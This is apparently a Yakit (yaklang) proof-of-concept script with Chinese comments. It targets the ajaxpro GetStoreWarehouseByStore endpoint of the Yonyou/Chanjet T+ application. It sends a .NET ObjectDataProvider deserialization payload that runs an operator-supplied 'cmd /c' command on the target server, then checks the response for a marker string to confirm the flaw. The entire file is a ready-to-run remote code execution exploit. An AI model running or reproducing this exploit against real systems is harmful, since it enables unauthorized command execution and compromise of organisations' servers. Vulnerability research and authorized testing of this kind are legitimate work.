yakit.AutoInitYakit()
log.setLevel("info")  // 设置日志级别

// 编写核心发包函数
sendPacket = func(target, cmd) {
    return poc.HTTP(`POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Sec-Ch-Ua-Platform: \"Windows\"
Accept-Encoding: gzip, deflate
X-Ajaxpro-Method: GetStoreWarehouseByStore
Content-Type: text/plain

{"storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c {{params(cmd)}}}"
        }
    }
}}`,
        poc.params({
            "cmd": cmd,
            "target": target,
        }),
    )
}

yakit.SetProgress(0.1)
yakit.Info("开始准备接受参数：%v","...")
// 获取参数
target = cli.String("target")
if target == "" {
    die("no target")
}
cmd = cli.String("cmd")
if cmd == ""{
    die("no cmd")
}
yakit.SetProgress(0.3)
yakit.Info("接受参数成功：%v",target)
yakit.Info("接受参数成功：%v",cmd)

time.sleep(1.0)

yakit.Info("准备发送数据包")
// 使用生成的命令发包
rsp, _, err = sendPacket(target, cmd)
die(err)

yakit.Info("准备检测结果")
// 取出发送的数据包中的结果，检测内容
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
if str.MatchAllOfSubString(body, "actorId或archivesId不能为空") {
    log.info("漏洞存在")
    yakit.SetProgress(1.0)
    yakit.Info("发现漏洞：%v",target)
}else{
    yakit.Info("漏洞检测失败，无漏洞")
}
